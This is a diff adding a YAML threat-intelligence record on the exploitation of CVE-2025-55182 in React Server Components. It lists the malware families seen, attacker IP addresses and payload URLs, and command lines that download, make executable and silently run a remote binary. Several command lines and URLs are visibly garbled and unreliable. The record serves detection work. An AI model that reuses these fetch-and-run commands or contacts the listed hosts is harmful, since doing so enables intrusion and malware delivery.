@@ -1,0 +1,44 @@
+description: '''Exploitation of CVE-2025-55182 in React Server Components leading
+  to remote code execution.'''
+attribution: 'null'
+malware_families: '[''Cobalt Strike'', ''Mirai'', ''Nezha'', ''FRP'', ''Sliver'',
+  ''Go-based backdoor'', ''Secret-Hunter'']'
+TTPs:
+  processes:
+  - bash
+  commandline:
+  - nohup ${BIN_PATH}\" >/dev/null 2>&1 &
+  - echo \"[x] T4 ELF} |s{DOWNLOAD_URL}\"dovnload \"S{DOWNLOAD_URL}\" ${BIN_PATH}\"chmod
+    +x \"${BIN_PATH}\"nohup ${BIN_PATH}\" >/dev/null 2>&1 &
+  scripting_engine:
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - http://154.89.152.240//a x64
+  - http://154.89.152.240//2 x86
+  - 'ht tp: //38. 165. 44 205/1'
+  - 'ittp: //38.165.44.205/api'
+  file_activity:
+  - ${BIN_PATH}
+  - ${WORK_DIR}/${PROGRAM_NAME}
+  - ${WORK_DIR}/${CONFIG_FRAME}
+  persistence:
+  - Creating work directory and restarting program with nohup
+  process_relations: []
+CVEs: '[''CVE-2025-55182'']'
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 154.89.152.240
+  - 38.165.44.205
+  domains: []
+  urls:
+  - http://154.89.152.240//a x64
+  - http://154.89.152.240//2 x86
+  - 'ht tp: //38. 165. 44 205/1'
+  - 'ittp: //38.165.44.205/api'
+authors: '[''Kelly Lee'', ''Ayman Ben-naceur'', ''Lachlan Davidson'']'
+reference: https://www.trendmicro.com/en_us/research/25/l/CVE-2025-55182-analysis-poc-itw.html
+date_of_publication: December 10, 2025
+file_creation_date: December 11, 2025
